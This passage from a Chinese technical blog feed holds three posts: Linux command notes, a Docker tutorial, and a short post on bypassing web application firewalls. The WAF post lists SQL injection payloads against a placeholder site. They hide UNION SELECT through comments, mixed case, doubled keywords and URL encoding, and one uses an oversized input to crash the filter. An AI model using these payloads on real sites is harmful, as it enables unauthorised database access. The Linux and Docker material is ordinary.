<p>   -f  ：忽略大小写的差异，例如 A 与 a 视为编码相同；<br>   -b  ：忽略最前面的空格符部分；<br>   -n  ：使用『纯数字』进行排序(默认是以文字型态来排序的)；<br>   -r  ：反向排序；<br>   -u  ：就是 uniq ，相同的数据中，仅出现一行代表；<br>   -t  ：分隔符，默认是用 [tab] 键来分隔；<br>   -k  ：以那个区间 (field) 来进行排序的意思<br>  使用：sort -u fsocity.dic &gt; sorted.txt</p>
<h3 id="13-id命令"><a href="#13-id命令" class="headerlink" title="13 id命令"></a>13 id命令</h3><p>id命令可以显示真实有效的用户ID（UID）和用户ID（GID）。UID是对一个用户的单一身份表示。组ID则对应多个UID。id命令已经默认预装在大多数的Linux系统中。要使用它，只需要你在控制台输入id。</p>
</li>
</ul>
<p>当我们想知道某个用户的UID和GID时，id命令是非常有用的。一些程序可能需要UID/GID来运行。id使我们更容易地找出用户UID以及GID而不必再/etc/group文件中查找</p>
<p><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720161206113349.png" alt=""><br>解释：<br>``用户ubuntu的UID号码=1000，GID号码=1000<br>语法：</p>
<p><code>id [-gGnru][--help][--version][用户名称]</code><br>选项：</p>
<pre><code>-g或--group 　 显示用户所属群组的ID。 
-G或--groups 显示用户所属附加群组的ID。 
-n或--name 　 显示用户，所属群组或附加群组的名称。 
-r或--real 　 显示实际ID。 
-u或--user 　 显示用户ID。
</code></pre><h3 id="13-find命令"><a href="#13-find命令" class="headerlink" title="13 find命令"></a>13 find命令</h3><p>find命令用来在指定目录下查找文件。任何位于参数之前的字符串都将视为欲查找的的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。</p>
<p>以下列举平时常用到的：</p>
<p><code>find / -type 类型参数</code></p>
<ul>
<li>f：普通文件</li>
<li>l：符号连接</li>
<li>d：目录</li>
</ul>
<p>根据文件权限/所有权进行匹配<br>当前目录下搜索出权限为777的文件<code>find . -type f -perm 777</code></p>
<p>找出当前目录用户tom拥有的所有文件<code>find . -type f -user tome</code></p>
<h3 id="14-在Linux文件中权限的问题"><a href="#14-在Linux文件中权限的问题" class="headerlink" title="14 在Linux文件中权限的问题"></a>14 在Linux文件中权限的问题</h3><p><code>r(Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目 录的权限。</code><br><code>w(Write,写入)：对文件而言，具有新增、修改文件内容的权限；对目录来说，具有删除、移动目录内文件的权限。</code><br><code>x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录了来说该用户具有进入目录的权限。</code><br><code>s或S（SUID）：可执行的稳健搭配这个权限，便能得到特权，任意存取改文件的所有者能使用全部系统资源</code></p>
<h3 id="15-wget命令"><a href="#15-wget命令" class="headerlink" title="15 wget命令"></a>15 wget命令</h3><p><code>wget -r -p -np -k http://xxx.com/xxx</code></p>
<ul>
<li>r, –recursive（递归）specify recursive download.（指定递归下载）</li>
<li>p, –page-requisites（页面必需元素） get all images, etc. needed to display HTML page.（下载所有的图片等页面显示所需的内容）</li>
<li>np, –no-parent（不追溯至父级） don’t ascend to the parent directory.</li>
<li>k, –convert-links（转换链接） make links in downloaded HTML point to local files.（将下载的HTML页面中的链接转换为相对链接即本地链接）</li>
</ul>
<p>例：<code>wget -r -p -np -k http://jdrops.dropsec.xyz/</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-strings命令&quot;&gt;&lt;a href=&quot;#1-strings命令&quot; class=&quot;headerlink&quot; title=&quot;1 strings命令&quot;&gt;&lt;/a&gt;1 strings命令&lt;/h3&gt;&lt;p&gt;strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印的任意序列，以换行符或空字符结束。strings命令对识别随机对象文件很有用。&lt;/p&gt;
&lt;p&gt;语法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;strings [-a] [-] [-o] [-t Format] [-n Number] [file…]&lt;/p&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>渗透绕WAF的方法</title>
    <link href="http://yoursite.com/2016/11/15/%E6%B8%97%E9%80%8F%E7%BB%95WAF%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2016/11/15/渗透绕WAF的方法/</id>
    <published>2016-11-15T12:05:06.000Z</published>
    <updated>2016-12-04T14:52:28.623Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基本-简单绕过方法"><a href="#基本-简单绕过方法" class="headerlink" title="基本/简单绕过方法"></a>基本/简单绕过方法</h3><h4 id="1-注释符"><a href="#1-注释符" class="headerlink" title="1.注释符"></a>1.注释符</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3,4…
</code></pre><h4 id="2-使用大小写"><a href="#2-使用大小写" class="headerlink" title="2.使用大小写"></a>2.使用大小写</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 uNIoN SeLEct 1,2,3,4…
</code></pre><h4 id="3-结合前面两种方法"><a href="#3-结合前面两种方法" class="headerlink" title="3.结合前面两种方法"></a>3.结合前面两种方法</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 /*!unIOn*//*!SelECT*/ 1,2,3..
</code></pre><h4 id="4-关键字替换"><a href="#4-关键字替换" class="headerlink" title="4.关键字替换"></a>4.关键字替换</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 UNIunionON SELselectECT 1,2,3,4…
适用于一些会把union select替换掉的WAF
</code></pre><a id="more"></a>
<h4 id="5-内部注释"><a href="#5-内部注释" class="headerlink" title="5.内部注释"></a>5.内部注释</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4…
U替换为%55，S替换为%53 在 union 和 select 之间添加注释/**/
</code></pre><h3 id="高级绕过方法"><a href="#高级绕过方法" class="headerlink" title="高级绕过方法"></a>高级绕过方法</h3><h4 id="1-使用其他变量或者命令对注入语句进行替换"><a href="#1-使用其他变量或者命令对注入语句进行替换" class="headerlink" title="1.使用其他变量或者命令对注入语句进行替换"></a>1.使用其他变量或者命令对注入语句进行替换</h4><pre><code>group_concat() | concat_ws()
@@version | version()
concat() | concat_ws()
COMMAND | WHAT TO USE INSTEAD
</code></pre><h4 id="2-对字母进行编码"><a href="#2-对字母进行编码" class="headerlink" title="2.对字母进行编码"></a>2.对字母进行编码</h4><pre><code>http://www.xxx.com/index.php?page_id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4….
</code></pre><h4 id="3-利用WAF本身的功能绕过"><a href="#3-利用WAF本身的功能绕过" class="headerlink" title="3.利用WAF本身的功能绕过"></a>3.利用WAF本身的功能绕过</h4><p>若发现WAF会把”*”替换为空，则可以利用这一特性来绕过</p>
<pre><code>http://www.xxx.com/index.php?page_id=-1+un*ion+se*lect+1,2,3..
其它方法：-15+(uNioN)+(sElECt)….-15+(uNioN+SeleCT)+…-15+(UnI)(oN)+(SeL)(ecT)+….-15+union (select 1,2,3,4…)‍
</code></pre><h4 id="4-缓冲区溢出使防火墙崩溃"><a href="#4-缓冲区溢出使防火墙崩溃" class="headerlink" title="4.缓冲区溢出使防火墙崩溃"></a>4.缓冲区溢出使防火墙崩溃</h4><p>大部分防火墙都是基于c/c++开发，故可以使用缓冲区溢出使WAF崩溃</p>
<pre><code>http://www.xxx.com/index.php?page_id=-1+and+(select1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4
使用如下方法测试WAF
?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;基本-简单绕过方法&quot;&gt;&lt;a href=&quot;#基本-简单绕过方法&quot; class=&quot;headerlink&quot; title=&quot;基本/简单绕过方法&quot;&gt;&lt;/a&gt;基本/简单绕过方法&lt;/h3&gt;&lt;h4 id=&quot;1-注释符&quot;&gt;&lt;a href=&quot;#1-注释符&quot; class=&quot;headerlink&quot; title=&quot;1.注释符&quot;&gt;&lt;/a&gt;1.注释符&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;http://www.xxx.com/index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3,4…
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&quot;2-使用大小写&quot;&gt;&lt;a href=&quot;#2-使用大小写&quot; class=&quot;headerlink&quot; title=&quot;2.使用大小写&quot;&gt;&lt;/a&gt;2.使用大小写&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;http://www.xxx.com/index.php?page_id=-1 uNIoN SeLEct 1,2,3,4…
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&quot;3-结合前面两种方法&quot;&gt;&lt;a href=&quot;#3-结合前面两种方法&quot; class=&quot;headerlink&quot; title=&quot;3.结合前面两种方法&quot;&gt;&lt;/a&gt;3.结合前面两种方法&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;http://www.xxx.com/index.php?page_id=-1 /*!unIOn*//*!SelECT*/ 1,2,3..
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&quot;4-关键字替换&quot;&gt;&lt;a href=&quot;#4-关键字替换&quot; class=&quot;headerlink&quot; title=&quot;4.关键字替换&quot;&gt;&lt;/a&gt;4.关键字替换&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;http://www.xxx.com/index.php?page_id=-1 UNIunionON SELselectECT 1,2,3,4…
适用于一些会把union select替换掉的WAF
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="渗透技巧" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>docker学习</title>
    <link href="http://yoursite.com/2016/11/10/docker%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2016/11/10/docker学习/</id>
    <published>2016-11-10T06:49:34.000Z</published>
    <updated>2016-12-04T15:07:47.212Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h3><p>什么是容器？</p>
<pre><code>一种虚拟化的方案
操作系统级别的虚拟化
只能运行相同或相似内核的操作系统
依赖于Linux内核特性:Namespace和Cgroup(Control Group)
</code></pre><p><img src="http://yotuku.cn/link?url=EyDp5bTlM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=2176a6e5-d922-47e9-80d7-c5a752db4ad7&amp;tk_time=2016111015" alt=""><br>什么是Docker?</p>
<pre><code>将应用程序自动部署到容器的开源引擎
Go语言开源引擎  Github地址： [](https://github.com/docker/docker)
基于Apache 2.0开源授权协议发行
</code></pre><a id="more"></a>
<p>Docker的特点？</p>
<pre><code>提供简单轻量的建模方式
职责的逻辑分离
快速搞笑的开发生命周期
鼓励使用面向服务的架构
</code></pre><p>Docker的使用场景</p>
<pre><code>1 使用Docker容器开发，测试，部署服务
2 创建隔离的运行环境
3 搭建测试环境
4 构建多用户的平台即服务基础设施
5 提供软件即服务应用程序
6 高性能，多规模的宿主机部署
</code></pre><p>Docker的基本组成</p>
<pre><code>Docker Client客户端；Daemon守护进程；Image镜像；Container容器;Registry仓库
</code></pre><h4 id="Docker客户端-守护进程"><a href="#Docker客户端-守护进程" class="headerlink" title="Docker客户端/守护进程"></a>Docker客户端/守护进程</h4><pre><code> C/S架构
本地/远程
</code></pre><p><img src="http://yotuku.cn/link?url=E1d-1fTlz&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=2176a6e5-d922-47e9-80d7-c5a752db4ad7&amp;tk_time=2016111015" alt=""></p>
<h4 id="Docker-Image镜像"><a href="#Docker-Image镜像" class="headerlink" title="Docker Image镜像"></a>Docker Image镜像</h4><pre><code>容器的基石（容器基于镜像启动和运行，镜像就好比容器的的源代码，保存了启动容器的各种条件）
层叠的只读文件系统 bootfs(引导文件系统）当容器启动后将被移到内存中，而引导文件系统将会被卸载;
联合加载（union mount)
</code></pre><h3 id="容器的基本操作"><a href="#容器的基本操作" class="headerlink" title="容器的基本操作"></a>容器的基本操作</h3><p>交互式容器在命令结束后，就停止</p>
<p>启动容器：</p>
<pre><code>$docker run IMAGE [COMMAND][ARG...]
run  在新容器中执行命令
执行单次命令的容器:
ubuntu@ubuntu:~$ docker run ubuntu echo &apos;Hello world&apos;
Hello world

启动交互式容器：
$docker run -i -t IMAGE /bin/bash
    -i --interactive=ture|fasle 默认是false  交互
    -t --tty=true|false 默认是false
ubuntu@ubuntu:~$ docker run -i -t ubuntu /bin/bash
root@44d36a84c016:/# ps -ef
UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0 03:48 ?        00:00:00 /bin/bash
root         12      1  0 03:49 ?        00:00:00 ps -ef
root@44d36a84c016:/# ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
root@44d36a84c016:/# exit
exit
</code></pre><p>查看容器</p>
<pre><code>$docker ps [-a][-l]
    -a 列出所有的容器
    -l 列出最新创建的容器

CONTAINEG ID docker的守护进程，当启动时为容器分配的唯一ID
NAMES    docker守护进程启动时为容器自动分配的名字

ubuntu@ubuntu:~$ docker ps -l
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES
44d36a84c016        ubuntu:latest       &quot;/bin/bash&quot;         7 minutes ago       Exited (0) 6 minutes ago                       gloomy_bohr  
</code></pre><p>如何查看刚刚创建的容器</p>
<pre><code>$docker inspect 参数：容器的名字（ID或友好的名字)
ubuntu@ubuntu:~$ docker inspect 44d36a84c016
[{
&quot;AppArmorProfile&quot;: &quot;&quot;,
&quot;Args&quot;: [],
&quot;Config&quot;: {
    &quot;AttachStderr&quot;: true,
    &quot;AttachStdin&quot;: true,
    &quot;AttachStdout&quot;: true,
    &quot;Cmd&quot;: [
        &quot;/bin/bash&quot;
    ],
    &quot;CpuShares&quot;: 0,
      ........
</code></pre><p>自定义容器名</p>
<pre><code>$docker run --name=自定义名 -i -t IMAGE /bin/bash

ubuntu@ubuntu:~$ docker run --name=container01 -i -t ubuntu /bin/bash
root@89fdd67fcc7c:/# exit
exit
ubuntu@ubuntu:~$ docker inspect container01 
</code></pre><p>重新启动停止的容器</p>
<pre><code>$docker start [-i] 容器名

ubuntu@ubuntu:~$ docker start -i container01 
root@89fdd67fcc7c:/# exit
exit
</code></pre><p>删除停止的容器（只能删除停止的容器)</p>
<pre><code>$docker rm 容器名

ubuntu@ubuntu:~$ docker rm a14eae563c17
a14eae563c17
</code></pre><h3 id="守护式容器"><a href="#守护式容器" class="headerlink" title="守护式容器"></a>守护式容器</h3><p>守护式容器，长期运行，没有交互式的会话，适合运行应用程序和服务</p>
<p>以守护形式运行容器</p>
<pre><code>$docker run -i -t IMAGE /bin/bash
Ctrl+P + Ctrl+Q  将一个交互式的容器转到后台

ubuntu@ubuntu:~$ docker run -i -t ubuntu /bin/bash
root@7a5baebf940a:/# 
root@7a5baebf940a:/# ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
7a5baebf940a        ubuntu:latest       &quot;/bin/bash&quot;         3 minutes ago       Up 3 minutes                            dreamy_hopper   
</code></pre><p>附加到运行中的容器</p>
<pre><code>$docker attach 容器名

ubuntu@ubuntu:~$ docker attach 7a

root@7a5baebf940a:/# ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
7a5baebf940a        ubuntu:latest       &quot;/bin/bash&quot;         7 minutes ago       Up 7 minutes                            dreamy_hopper       
ubuntu@ubuntu:~$ docker attach 7a

root@7a5baebf940a:/# exit
exit
ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES  
</code></pre><p>启动守护式容器</p>
<pre><code>$docker run 镜像名 [COMMAND] [ARG...]
    -d 告诉run命令在启动容器时使用后台的方式来执行命令

ubuntu@ubuntu:~$ docker run --name dc3 -d ubuntu /bin/sh -c &quot;while true;do echo hello world;sleep 1;done&quot;
29de71a93dfaf67cb27b6fa5d953ecd6ca924e6b1923a31d6f41995af268af24
ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                CREATED             STATUS              PORTS               NAMES
29de71a93dfa        ubuntu:latest       &quot;/bin/sh -c &apos;while t   4 seconds ago       Up 3 seconds                            dc3        
</code></pre><p>查看容器日志</p>
<pre><code>$docker logs [-f][-t][--tail] 容器名
    -f --follows=true|false 默认为false 会一直跟踪日志变化，并返回结果
    -t --timestamps=true|false 默认为false
    --tail=&quot;all&quot;  返回结尾处多少数量的日志

ubuntu@ubuntu:~$ docker logs -t -f --tail 10 dc3
2016-11-13T04:52:46.493926964Z hello world
2016-11-13T04:52:47.495737431Z hello world
2016-11-13T04:52:48.497870319Z hello world
2016-11-13T04:52:49.499945897Z hello world
2016-11-13T04:52:50.501718368Z hello world
2016-11-13T04:52:51.503647625Z hello world .....
</code></pre><p>查看容器内进程</p>
<pre><code>$docker top 容器名

Cubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                CREATED             STATUS              PORTS               NAMES
29de71a93dfa        ubuntu:latest       &quot;/bin/sh -c &apos;while t   4 minutes ago       Up 4 minutes                            dc3                 
ubuntu@ubuntu:~$ docker top dc3
UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD
root                69209               66638               0                   20:51               ?                   00:00:00            /bin/sh -c while true;do echo hello world;sleep 1;done
root                69613               69209               0                   20:56               ?                   00:00:00            sleep 1
</code></pre><p>为运行中的容器启动新进程（对运行中的容器维护监控或执行一些管理任务）</p>
<pre><code>$docker exec [-d][-i][-t] 容器名 [COMMAND][ARG..]

ubuntu@ubuntu:~$ docker exec -i -t dc3 /bin/bash
root@29de71a93dfa:/# ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ docker top dc3
UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD
root                69209               66638               0                   20:51               ?                   00:00:00            /bin/sh -c while true;do echo hello world;sleep 1;done
root                69914               66638               0                   21:01               pts/1               00:00:00            /bin/bash
root                69963               69209               0                   21:01               ?                   00:00:00            sleep 1
</code></pre><p>如何停止运行中的容器：</p>
<pre><code>$docker stop 容器名 发送一个信号给容器，并等待容器的停止
$docker kill 容器名  会立刻停止容器

ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                CREATED             STATUS              PORTS               NAMES
29de71a93dfa        ubuntu:latest       &quot;/bin/sh -c &apos;while t   14 minutes ago      Up 14 minutes                           dc3                 
ubuntu@ubuntu:~$ docker stop dc3
dc3
</code></pre><h3 id="使用Docker帮助文件"><a href="#使用Docker帮助文件" class="headerlink" title="使用Docker帮助文件"></a>使用Docker帮助文件</h3><pre><code>man docker-run
man docker-logs
man docker-top
man docker-exec
...
</code></pre><h3 id="在容器中部署静态网站"><a href="#在容器中部署静态网站" class="headerlink" title="在容器中部署静态网站"></a>在容器中部署静态网站</h3><p>设置容器的端口映射</p>
<p>设置容器的端口映射</p>
<pre><code>run [-P][-p]
    -P,--publish-all=ture|false默认为false
将为容器暴露的所有端口进行映射
docker run -P -i -t ubuntu /bin/bash 
    -p,--publish=[]  
containerPort 只指定容器的端口，宿主机端口随机映射
  docker run -p 80 -i -t ubuntu /bin/bash
hostPort:containerPort 同时指定宿主机端口和容器端口
  docker run -p 8080:80 -i -t ubuntu /bin/bash
ip::containerPort  指定ip和容器的端口
  docker run -p 0.0.0.0:80 -i -t ubuntu /bin/bash
ip:hostPort:containerPort 同时指定ip,宿主机和容器的端口
  docker run -p 0.0.0.0:8080:80 -i -t ubuntu /bin/bash
</code></pre><p>Nginx部署流程</p>
<ul>
<li>创建映射80端口的交互式容器</li>
<li>安装Nginx</li>
<li>安装文本编辑器vim</li>
<li>创建静态页面</li>
<li>修改Nginx配置文件</li>
<li>运行Nginx</li>
<li>验证网站访问</li>
</ul>
<p>-</p>
<pre><code>ubuntu@ubuntu:~$ docker run -p 80 --name web -i -t ubuntu /bin/bash
root@3fdfe785153a:/# apt-get update 
root@3fdfe785153a:/# apt-get install -y nginx
root@3fdfe785153a:/# apt-get install -y
root@3fdfe785153a:/# mkdir -p /var/www/html
root@3fdfe785153a:/# cd /var/www/html 
root@3fdfe785153a:/var/www/html# vim index.html

&lt;html&gt;
&lt;head&gt;
        &lt;title&gt;Nginx in Docker&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
        &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;

root@3fdfe785153a:/var/www/html# whereis nginx
nginx: /usr/sbin/nginx /etc/nginx /usr/share/nginx
root@3fdfe785153a:/var/www/html# ls
index.html  index.nginx-debian.html
root@3fdfe785153a:/var/www/html# ls /etc/nginx 
conf.d        fastcgi_params  koi-win     nginx.conf    scgi_params      sites-enabled  uwsgi_params
fastcgi.conf  koi-utf         mime.types  proxy_params  sites-available  snippets       win-utf
root@3fdfe785153a:/var/www/html# ls /etc/nginx/sites-enabled 
default
root@3fdfe785153a:/var/www/html# vim /etc/nginx/sites-enabled/default 
root@3fdfe785153a:/var/www/html# cd /
root@3fdfe785153a:/# nginx
root@3fdfe785153a:/# ps -ef
UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0 05:36 ?        00:00:00 /bin/bash
root        816      1  0 06:12 ?        00:00:00 nginx: master process nginx
www-data    817    816  0 06:12 ?        00:00:00 nginx: worker process
www-data    818    816  0 06:12 ?        00:00:00 nginx: worker process
www-data    819    816  0 06:12 ?        00:00:00 nginx: worker process
www-data    820    816  0 06:12 ?        00:00:00 nginx: worker process
root        821      1  0 06:12 ?        00:00:00 ps -ef
root@3fdfe785153a:/# ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                   NAMES
3fdfe785153a        ubuntu:latest       &quot;/bin/bash&quot;         37 minutes ago      Up 37 minutes       0.0.0.0:32768-&gt;80/tcp   web                 
ubuntu@ubuntu:~$ docker port web
80/tcp -&gt; 0.0.0.0:32768
ubuntu@ubuntu:~$ docker top web
UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD
root                70403               66638               0                   21:36               pts/1               00:00:00            /bin/bash
root                71341               70403               0                   22:12               ?                   00:00:00            nginx: master process nginx
www-data            71342               71341               0                   22:12               ?                   00:00:00            nginx: worker process
www-data            71343               71341               0                   22:12               ?                   00:00:00            nginx: worker process
www-data            71344               71341               0                   22:12               ?                   00:00:00            nginx: worker process
www-data            71345               71341               0                   22:12               ?                   00:00:00            nginx: worker process
ubuntu@ubuntu:~$ curl http://127.0.0.1:32768
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Nginx in Docker&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p><img src="http://yotuku.cn/link?url=B1HpSFr-l&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=2176a6e5-d922-47e9-80d7-c5a752db4ad7&amp;tk_time=2016111314" alt=""></p>
<pre><code>上面使用的是宿主主机地址，现在使用容器的地址
ubuntu@ubuntu:~$ docker inspect web

&quot;Gateway&quot;: &quot;172.17.42.1&quot;

ubuntu@ubuntu:~$ curl http://172.17.0.10
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Nginx in Docker&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;

stop后重新启动访问

ubuntu@ubuntu:~$ docker stop web
web
ubuntu@ubuntu:~$ docker start -i web
root@3fdfe785153a:/# ps -ef
UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0 06:25 ?        00:00:00 /bin/bash
root         11      1  0 06:27 ?        00:00:00 ps -ef
root@3fdfe785153a:/# ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ docker exec web nginx
ubuntu@ubuntu:~$ docker top web
UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD
root                71751               66638               0                   22:25               pts/1               00:00:00            /bin/bash
root                71809               71751               0                   22:28               ?                   00:00:00            nginx: master process nginx
www-data            71810               71809               0                   22:28               ?                   00:00:00            nginx: worker process
www-data            71811               71809               0                   22:28               ?                   00:00:00            nginx: worker process
www-data            71812               71809               0                   22:28               ?                   00:00:00            nginx: worker process
www-data            71813               71809               0                   22:28               ?                   00:00:00            nginx: worker process
</code></pre><p>当停止一个容器并且重新访问时，原来容器的ip地址和端口都将会发生变化</p>
<pre><code>ubuntu@ubuntu:~$ curl http://172.17.0.10
curl: (7) Failed to connect to 172.17.0.10 port 80: No route to host
ubuntu@ubuntu:~$ docker inspect web
.....
  &quot;MountLabel&quot;: &quot;&quot;,
    &quot;Name&quot;: &quot;/web&quot;,
    &quot;NetworkSettings&quot;: {
        &quot;Bridge&quot;: &quot;docker0&quot;,
        &quot;Gateway&quot;: &quot;172.17.42.1&quot;,
        &quot;GlobalIPv6Address&quot;: &quot;&quot;,
        &quot;GlobalIPv6PrefixLen&quot;: 0,
        &quot;IPAddress&quot;: &quot;172.17.0.11&quot;,
        &quot;IPPrefixLen&quot;: 16,
        &quot;IPv6Gateway&quot;: &quot;&quot;,
        &quot;LinkLocalIPv6Address&quot;: &quot;fe80::42:acff:fe11:b&quot;,
        &quot;LinkLocalIPv6PrefixLen&quot;: 64,
        &quot;MacAddress&quot;: &quot;02:42:ac:11:00:0b&quot;,
        &quot;PortMapping&quot;: null,
        &quot;Ports&quot;: {
            &quot;80/tcp&quot;: [
                {
                    &quot;HostIp&quot;: &quot;0.0.0.0&quot;,
                    &quot;HostPort&quot;: &quot;32769&quot;
                }
....
ubuntu@ubuntu:~$ curl http://172.17.0.11
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Nginx in Docker&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Hello,I&apos;m website in Docker!&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><h3 id="查看和删除镜像"><a href="#查看和删除镜像" class="headerlink" title="查看和删除镜像"></a>查看和删除镜像</h3><p>镜像的存储地址</p>
<ul>
<li>/var/lib/docker</li>
</ul>
<p>-</p>
<pre><code>ubuntu@ubuntu:~$ docker info
Containers: 11
Images: 94
Storage Driver: aufs
 Root Dir: /var/lib/docker/aufs
 Backing Filesystem: extfs
 Dirs: 116
 Dirperm1 Supported: true
Execution Driver: native-0.2
Kernel Version: 4.2.0-16-generic
Operating System: Ubuntu 15.10
CPUs: 4
Total Memory: 1.533 GiB
Name: ubuntu
ID: AL2G:N2BW:2DGD:DBKV:GV77:ESDE:5BIG:BOYM:25H2:MHLX:KJK3:VNBF
WARNING: No swap limit support
ubuntu@ubuntu:~$ ls -l /var/lib/docker/aufs
ls: cannot access /var/lib/docker/aufs: Permission denied
ubuntu@ubuntu:~$ sudo ls -l /var/lib/docker/aufs
[sudo] password for ubuntu: 
total 48
drwxr-xr-x 118 root root 16384 Nov 12 21:36 diff
drwxr-xr-x   2 root root 16384 Nov 12 21:36 layers
drwxr-xr-x 118 root root 16384 Nov 12 21:36 mnt
</code></pre><h4 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h4><pre><code>$docker images [OPTSIUNS][REPOSITORY]
   -a,--all=false
   -f,--filter=[]  显示时的过滤条件
   --no-trunc=false  指定不使用截断的方式
   -q,--quiet=false
</code></pre><h4 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h4><pre><code>$docker inspect [OPTIONS]CONTAINER|IMAGE[CONTAINER|IMAGE...]
   -f,--format=&quot;&quot;

ubuntu@ubuntu:~$ docker inspect ubuntu:latest 
</code></pre><h4 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h4><pre><code>$docker rmi [OPTIONS]IMAGE[IMAGE...]
   -f,--force=false 
   --no-prune=false Do not delete untagged parents

ubuntu:~$ docker rmi wordpress:4.6.1 
</code></pre><h3 id="获取和推送镜像"><a href="#获取和推送镜像" class="headerlink" title="获取和推送镜像"></a>获取和推送镜像</h3><h4 id="查找镜像"><a href="#查找镜像" class="headerlink" title="查找镜像"></a>查找镜像</h4><ul>
<li>Docker Hub</li>
</ul>
<p><a href="https://registry.hub.docker.com" target="_blank" rel="external"></a></p>
<ul>
<li><p>$docker search [OPTIONS]TERM</p>
<pre><code>--automated=false Only show automated builds 自动化选项
--no-trunc=false Don&apos;t truncate output 
-s,--stars=0  Only displays with at least x start 星级
最多返回25个结果
ubuntu@ubuntu:~$ docker search -s 3 ubuntu
NAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED
ubuntu                            Ubuntu is a Debian-based Linux operating s...   5033      [OK]       
ubuntu-upstart                    Upstart is an event-based replacement for ...   68        [OK]       
rastasheep/ubuntu-sshd            Dockerized SSH service, built on top of of...   49                   [OK]
consol/ubuntu-xfce-vnc            Ubuntu container with &quot;headless&quot; VNC sessi...   29                   [OK]
ubuntu-debootstrap                debootstrap --variant=minbase --components...   27        [OK]       
torusware/speedus-ubuntu          Always updated official Ubuntu docker imag...   27                   [OK]
ioft/armhf-ubuntu                 [ABR] Ubuntu Docker images for the ARMv7(a...   19                   [OK]
